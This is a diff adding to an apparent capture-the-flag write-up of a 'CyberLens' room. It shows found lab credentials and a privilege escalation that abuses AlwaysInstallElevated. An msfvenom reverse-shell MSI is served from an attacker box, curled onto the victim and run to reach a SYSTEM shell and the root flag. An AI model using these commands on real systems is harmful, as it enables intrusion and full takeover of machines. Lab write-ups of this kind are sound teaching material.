@@ -85,4 +85,31 @@ File appears to contain credentials:
 CyberLens
 HackSmarter123
 
-Checked MSI policies
+Checked MSI policies and found "AlwaysInstallElevated is enabled, and MSI is Not Disabled
+![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/7546a965-1d72-4e50-a44b-ef550b9119e6)
+
+Created malicious msi file with msfvenom `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.205.247 LPORT=4445 -f msi -o malicious.msi`. set listening port to 4445 (to not interfere with open meterpreter shell on port 4444)
+
+started python http server on attacker box `python3 -m http.server` in the same folder as the malicious.msi file
+
+Used curl on victim box to curl the maliciuos.msi file from attacker box `curl http://10.10.205.247:8000/malicious.msi -o malicious.msi`\
+![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/9cc345fb-54af-47e3-90b7-6503e04d7ad0)
+
+Started nc listener on port 4445 `nc -nlvp 4445` on attacker box
+
+Executed msi file on victim box `./malicious.msi`
+
+Received shell as nt authority\system\ (got root)
+![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/b3a81216-fa79-4d20-a58b-37290fbd9b37)
+
+Navigated to C:\Users\Administrator\Desktop. Found admin.txt file
+
+11:05 am
+Obtained root flag from admin.txt file
+![image](https://github.com/mitch-n/redteam_writeups/assets/30005736/9e61b498-eaea-43b9-8fef-07c6872d0f6b)
+
+Closed all open channels to victim box
+Room Complete.
+
+
+
